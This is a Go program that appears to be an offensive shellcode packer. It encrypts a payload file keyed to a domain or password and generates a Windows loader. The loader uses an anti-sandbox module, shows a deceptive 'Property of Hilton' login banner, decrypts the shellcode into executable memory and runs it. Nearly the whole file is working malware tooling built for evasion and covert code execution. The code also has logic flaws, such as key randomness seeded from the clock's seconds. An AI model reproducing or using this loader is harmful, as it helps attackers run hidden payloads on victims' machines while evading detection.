package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"flag"
	"io/ioutil"
	"log"
	"math/rand"
	"os"
	"text/template"
	"time"
)



type args struct {
	Key        string
	Ciphertext string
}

func checkAndPanic(err error) {
	if err != nil {
		panic(err)
	}
}

func generateRandomBytes(n int) ([]byte, error) {
	b := make([]byte, n)
	t := time.Now()

	rand.Seed(int64(t.Second()))
	_, err := rand.Read(b)
	if err != nil {
		return nil, err
	}
	return b, nil
}


func encrypt(plaintext []byte, fullKey []byte) (string, string) {
	key := make([]byte, 32)
	var r_err error
	var rand []byte
	rem := 32 - len(fullKey)



	if rem < 0 {
		copy(key[0:24], []byte(fullKey)[0:24])
		//key = []byte(sbx.DomainName[:24]) // truncate the result to 24c
		rand, r_err = generateRandomBytes(8) // padding
		//key[24:] = rand
		copy(key[24:], rand)
	} else {
		copy(key[0:32-rem], fullKey)
		rand, r_err = generateRandomBytes(rem) // padding
		if r_err != nil {
			os.Exit(0)
		}
		copy(key[32-rem:], rand)
		//key[32-rem:] = []byte(rand)
	}

	block, _ := aes.NewCipher(key)
	ciphertext := make([]byte, len(plaintext))
	stream := cipher.NewCTR(block, key[aes.BlockSize:])
	stream.XORKeyStream(ciphertext, plaintext)

	return base64.StdEncoding.EncodeToString(ciphertext), base64.StdEncoding.EncodeToString(rand)
}

func main() {
	body := `
package main

import (
	"golang.org/x/crypto/ssh/terminal"
	"DomainKeyedEnc/pkg/AntiSandbox"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"os"
	"syscall"
	"unsafe"
)

// Bitmasks.
const (
	MEMCOMMIT            = 0x1000
	MEMRESERVE           = 0x2000
	PAGEEXECUTEREADWRITE = 0x40
)

var (
	kernel32     = syscall.NewLazyDLL("kernel32.dll")
	virtualAlloc = kernel32.NewProc("VirtualAlloc")
)

func alloc(size uintptr) (uintptr, error) {
	ptr, _, err := virtualAlloc.Call(0, size, MEMRESERVE|MEMCOMMIT, PAGEEXECUTEREADWRITE)
	if ptr == 0 {
		return 0, err
	}
	return ptr, nil
}

func main() {
	hilton_preample := `+"`" + `
*********************************************************************
*********************************************************************

			PROPERTY OF HILTON PROPERTIES INC

			AUTHORIZED PERSONNEL ONLY

			ANY UNAUTHORIZED USE WILL LEAD TO
		IMMEDIATE PROSECUTION PURSUANT TO CA. 1.3.189a

*********************************************************************
*********************************************************************
	` + "`" + `
	ciphertext, _ := base64.StdEncoding.DecodeString("{{.Ciphertext}}")
	sbx := AntiSandbox.NewSBX()
	domainName := sbx.DomainName
	key, _ := base64.StdEncoding.DecodeString("{{.Key}}")
	print(hilton_preample)

	passwd := make([]byte, 0)
	passwd, _ = terminal.ReadPassword(int(syscall.Stdin))
	
	domainName = string(passwd)
	composite_key := make([]byte, 32)

	dnLen := len(domainName)
	copy(composite_key[0:dnLen], []byte(domainName))
	copy(composite_key[dnLen:], key)

	key = composite_key

	block, _ := aes.NewCipher(key)
	plaintext := make([]byte, len(ciphertext))
	stream := cipher.NewCTR(block, key[aes.BlockSize:])
	stream.XORKeyStream(plaintext, ciphertext)
	ptr, err := alloc(uintptr(len(plaintext)))
	if err != nil {
		os.Exit(0)
	}
	buff := (*[890000]byte)(unsafe.Pointer(ptr))
	for x, y := range []byte(plaintext) {
		buff[x] = y
	}
	syscall.Syscall(ptr, 0, 0, 0, 0)
}
`


	file := flag.String("file", "", "file containing your payload")
	domainKey := flag.String("domain", "", "domain/workgroup to key against (Default: None)")
	passwd := flag.String("password", "", "add an INTERACTIVE password prompt to enter a password for decrypting the payload")
	flag.Parse()

	fullKey := "My NaMe iS GoLAnG aND I fuCkInG BloW at VArIaBLE ScoPEEE"
	_ = fullKey // HURR REMOVE ME AND THE WHOLE THING FUCKING BREAKS

	if *passwd != "" && *domainKey != ""{
		log.Fatal("Can't use domain keying and password at the same time as of this release")
	} else if *passwd != ""{
		fullKey = *passwd
	} else {
		fullKey = *domainKey
	}



	tmpl, err := template.New("body").Parse(body)
	checkAndPanic(err)

	data, err := ioutil.ReadFile(*file)
	checkAndPanic(err)

	ciphertext, key := encrypt(data, []byte(fullKey))
	tmpl.Execute(os.Stdout, args{
		Ciphertext: ciphertext,
		Key:        key,
	})
}
